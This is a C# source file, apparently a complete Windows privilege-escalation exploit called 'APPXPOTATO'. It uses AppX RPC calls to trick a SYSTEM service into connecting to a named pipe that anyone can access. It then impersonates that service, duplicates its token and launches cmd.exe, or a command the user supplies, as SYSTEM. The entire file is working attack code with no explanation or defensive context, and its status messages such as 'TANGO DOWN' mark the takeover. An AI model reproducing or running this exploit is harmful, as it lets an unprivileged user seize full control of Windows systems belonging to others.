using System;
using System.IO.Pipes;
using System.Threading;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Runtime.InteropServices;
using rpc_ae2dc901_312d_41df_8b79_e835e63db874_1_0;

namespace PNAC
{
    class GetSystem
    {
        private static string[] GlobalArgs;
        private static int dwThreadCount = 1;

        public class NamedPipeServerHelper
        {
            private const int STD_INPUT_HANDLE = -10;
            private const int STD_OUTPUT_HANDLE = -11;
            private const int STD_ERROR_HANDLE = -12;

            private const uint HANDLE_FLAG_INHERIT = 0x00000001;
            private const int STARTF_USESTDHANDLES = 0x00000100;

            public enum TOKEN_ACCESS : uint
            {
                STANDARD_RIGHTS_REQUIRED = 0x000F0000,
                STANDARD_RIGHTS_READ = 0x00020000,
                TOKEN_ASSIGN_PRIMARY = 0x0001,
                TOKEN_DUPLICATE = 0x0002,
                TOKEN_IMPERSONATE = 0x0004,
                TOKEN_QUERY = 0x0008,
                TOKEN_QUERY_SOURCE = 0x0010,
                TOKEN_ADJUST_PRIVILEGES = 0x0020,
                TOKEN_ADJUST_GROUPS = 0x0040,
                TOKEN_ADJUST_DEFAULT = 0x0080,
                TOKEN_ADJUST_SESSIONID = 0x0100,

                TOKEN_ALL_ACCESS =
                    (STANDARD_RIGHTS_REQUIRED |
                     TOKEN_ASSIGN_PRIMARY |
                     TOKEN_DUPLICATE |
                     TOKEN_IMPERSONATE |
                     TOKEN_QUERY |
                     TOKEN_QUERY_SOURCE |
                     TOKEN_ADJUST_PRIVILEGES |
                     TOKEN_ADJUST_GROUPS |
                     TOKEN_ADJUST_DEFAULT |
                     TOKEN_ADJUST_SESSIONID)
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct SECURITY_ATTRIBUTES
            {
                public int nLength;
                public IntPtr lpSecurityDescriptor;
                public int bInheritHandle;
            }

            public enum SECURITY_IMPERSONATION_LEVEL
            {
                SecurityAnonymous,
                SecurityIdentification,
                SecurityImpersonation,
                SecurityDelegation
            }

            public enum TOKEN_TYPE
            {
                TokenPrimary = 1,
                TokenImpersonation
            }

            public enum TOKEN_INFORMATION_CLASS
            {
                TokenUser = 1,
                TokenGroups,
                TokenPrivileges,
                TokenOwner,
                TokenPrimaryGroup,
                TokenDefaultDacl,
                TokenSource,
                TokenType,
                TokenImpersonationLevel,
                TokenStatistics,
                TokenRestrictedSids,
                TokenSessionId
            }

            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
            public struct STARTUPINFO
            {
                public Int32 cb;
                public string lpReserved;
                public string lpDesktop;
                public string lpTitle;
                public Int32 dwX;
                public Int32 dwY;
                public Int32 dwXSize;
                public Int32 dwYSize;
                public Int32 dwXCountChars;
                public Int32 dwYCountChars;
                public Int32 dwFillAttribute;
                public Int32 dwFlags;
                public Int16 wShowWindow;
                public Int16 cbReserved2;
                public IntPtr lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdError;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct PROCESS_INFORMATION
            {
                public IntPtr hProcess;
                public IntPtr hThread;
                public int dwProcessId;
                public int dwThreadId;
            }

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool ImpersonateNamedPipeClient(
                IntPtr hNamedPipe);

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool RevertToSelf();

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool CloseHandle(
                IntPtr handle);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr GetCurrentThread();

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool OpenThreadToken(
                IntPtr ThreadHandle,
                TOKEN_ACCESS DesiredAccess,
                bool OpenAsSelf,
                out IntPtr TokenHandle);

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool DuplicateTokenEx(
                IntPtr hExistingToken,
                TOKEN_ACCESS dwDesiredAccess,
                ref SECURITY_ATTRIBUTES lpTokenAttributes,
                SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
                TOKEN_TYPE TokenType,
                out IntPtr phNewToken);

            [DllImport("Kernel32.dll", SetLastError = true)]
            public static extern UInt32 WTSGetActiveConsoleSessionId();

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern Boolean SetTokenInformation(
                IntPtr TokenHandle,
                TOKEN_INFORMATION_CLASS TokenInformationClass,
                ref UInt32 TokenInformation,
                UInt32 TokenInformationLength);

            [DllImport("userenv.dll", SetLastError = true)]
            public static extern bool CreateEnvironmentBlock(
                out IntPtr lpEnvironment,
                IntPtr hToken,
                bool bInherit);

            [DllImport("userenv.dll", SetLastError = true)]
            public static extern bool DestroyEnvironmentBlock(
                IntPtr lpEnvironment);

            [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
            public static extern bool CreateProcessAsUserW(
                IntPtr hToken,
                string lpApplicationName,
                string lpCommandLine,
                IntPtr lpProcessAttributes,
                IntPtr lpThreadAttributes,
                bool bInheritHandles,
                uint dwCreationFlags,
                IntPtr lpEnvironment,
                string lpCurrentDirectory,
                ref STARTUPINFO lpStartupInfo,
                out PROCESS_INFORMATION lpProcessInformation);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr GetStdHandle(
                int nStdHandle);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool SetHandleInformation(
                IntPtr hObject,
                uint dwMask,
                uint dwFlags);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern uint WaitForSingleObject(
                IntPtr hHandle,
                uint dwMilliseconds);

            public static void AppXInterfaceCall()
            {
                try
                {
                    Console.WriteLine("[!] Calling AppXApplyTrustLabelToFolder_58");

                    Client client = new Client();
                    client.Connect();

                    string output;

                    client.AppXApplyTrustLabelToFolder_58(
                        "\\\\localhost\\\\pipe\\PNAC",
                        out output);

                    Console.WriteLine(output);
                }
                catch { }

                try
                {
                    Console.WriteLine("[!] Calling AppXSetTrustLabelOnPackage_59");

                    Client client = new Client();
                    client.Connect();

                    string output;

                    client.AppXSetTrustLabelOnPackage_59(
                        "\\\\localhost\\\\pipe\\PNAC",
                        out output);

                    Console.WriteLine(output);
                }
                catch { }
            }

            public static void NamedPipeServer(object data)
            {
                PipeSecurity ps = new PipeSecurity();

                SecurityIdentifier everyoneSid =
                    new SecurityIdentifier(
                        WellKnownSidType.WorldSid,
                        null);

                string everyone =
                    everyoneSid.Translate(
                        typeof(NTAccount)).ToString();

                ps.AddAccessRule(
                    new PipeAccessRule(
                        everyone,
                        PipeAccessRights.ReadWrite,
                        AccessControlType.Allow));

                NamedPipeServerStream pipeServer =
                    new NamedPipeServerStream(
                        "PNAC",
                        PipeDirection.InOut,
                        dwThreadCount,
                        PipeTransmissionMode.Byte,
                        PipeOptions.None,
                        1024,
                        1024,
                        ps);

                Console.WriteLine("[+] Created pipe: \\\\.\\pipe\\PNAC");

                IntPtr pipeHandle =
                    pipeServer.SafePipeHandle.DangerousGetHandle();

                Thread rpcThread = new Thread(() =>
                {
                    AppXInterfaceCall();
                });

                rpcThread.Start();

                Console.WriteLine("[!] Waiting for SYSTEM connection...");

                pipeServer.WaitForConnection();

                Console.WriteLine("[+] SYSTEM connected");

                if (!ImpersonateNamedPipeClient(pipeHandle))
                {
                    Console.WriteLine(
                        "[!] ImpersonateNamedPipeClient failed: {0}",
                        Marshal.GetLastWin32Error());

                    return;
                }

                Console.WriteLine("[+] Impersonation successful");

                IntPtr hToken;

                if (!OpenThreadToken(
                        GetCurrentThread(),
                        TOKEN_ACCESS.TOKEN_ALL_ACCESS,
                        true,
                        out hToken))
                {
                    Console.WriteLine(
                        "[!] OpenThreadToken failed: {0}",
                        Marshal.GetLastWin32Error());

                    return;
                }

                Console.WriteLine("[+] SYSTEM impersonation token acquired");

                SECURITY_ATTRIBUTES sa =
                    new SECURITY_ATTRIBUTES();

                sa.nLength =
                    Marshal.SizeOf(sa);

                IntPtr hPrimaryToken;

                if (!DuplicateTokenEx(
                        hToken,
                        TOKEN_ACCESS.TOKEN_ALL_ACCESS,
                        ref sa,
                        SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        TOKEN_TYPE.TokenPrimary,
                        out hPrimaryToken))
                {
                    Console.WriteLine(
                        "[!] DuplicateTokenEx failed: {0}",
                        Marshal.GetLastWin32Error());

                    return;
                }

                Console.WriteLine("[+] SYSTEM primary token created");

                uint sessionId =
                    WTSGetActiveConsoleSessionId();

                if (!SetTokenInformation(
                        hPrimaryToken,
                        TOKEN_INFORMATION_CLASS.TokenSessionId,
                        ref sessionId,
                        sizeof(UInt32)))
                {
                    Console.WriteLine(
                        "[!] SetTokenInformation failed: {0}",
                        Marshal.GetLastWin32Error());

                    return;
                }

                Console.WriteLine("[+] Token session adjusted");

                IntPtr lpEnvironment;

                if (!CreateEnvironmentBlock(
                        out lpEnvironment,
                        hPrimaryToken,
                        true))
                {
                    Console.WriteLine(
                        "[!] CreateEnvironmentBlock failed: {0}",
                        Marshal.GetLastWin32Error());

                    return;
                }

                IntPtr hStdIn =
                    GetStdHandle(STD_INPUT_HANDLE);

                IntPtr hStdOut =
                    GetStdHandle(STD_OUTPUT_HANDLE);

                IntPtr hStdErr =
                    GetStdHandle(STD_ERROR_HANDLE);

                SetHandleInformation(
                    hStdIn,
                    HANDLE_FLAG_INHERIT,
                    HANDLE_FLAG_INHERIT);

                SetHandleInformation(
                    hStdOut,
                    HANDLE_FLAG_INHERIT,
                    HANDLE_FLAG_INHERIT);

                SetHandleInformation(
                    hStdErr,
                    HANDLE_FLAG_INHERIT,
                    HANDLE_FLAG_INHERIT);

                const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;

                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(typeof(STARTUPINFO));

                // IMPORTANT for CreateProcessAsUserW stability
                si.lpDesktop = @"Winsta0\Default";

                si.dwFlags = STARTF_USESTDHANDLES;

                // standard handles (only safe if console is attached)
                si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
                si.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
                si.hStdError = GetStdHandle(STD_ERROR_HANDLE);

                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                // IMPORTANT: use StringBuilder for lpCommandLine (Win32 requirement)
                string cmdLine;
                if (GlobalArgs == null || GlobalArgs.Length == 0)
                    cmdLine = "cmd.exe";
                else
                    cmdLine = string.Join(" ", GlobalArgs);

                Console.WriteLine("[+] Launching SYSTEM cmd.exe inline");

                bool success = CreateProcessAsUserW(
                    hPrimaryToken,
                    null,
                    cmdLine,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    true,   // inherit handles
                    CREATE_UNICODE_ENVIRONMENT,
                    lpEnvironment,
                    Environment.CurrentDirectory,
                    ref si,
                    out pi
                );

                if (!success)
                {
                    Console.WriteLine("[!] CreateProcessAsUserW failed: {0}",
                        Marshal.GetLastWin32Error());
                    return;
                }

                Console.WriteLine("[+] TANGO DOWN");

                WaitForSingleObject(pi.hProcess, 0xFFFFFFFF);

                DestroyEnvironmentBlock(lpEnvironment);

                RevertToSelf();

                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);

                CloseHandle(hPrimaryToken);
                CloseHandle(hToken);

                pipeServer.Close();
            }
        }

        public static void SystemShell()
        {
            Console.WriteLine("[!] Launching APPXPOTATO");

            Thread[] pipeServers =
                new Thread[dwThreadCount];

            for (int i = 0; i < dwThreadCount; i++)
            {
                pipeServers[i] =
                    new Thread(
                        NamedPipeServerHelper.NamedPipeServer);

                pipeServers[i].Start();
            }

            foreach (Thread t in pipeServers)
            {
                t.Join();
            }
        }

        static void Main(string[] args)
        {
            GlobalArgs = args;
            SystemShell();
        }
    }
}
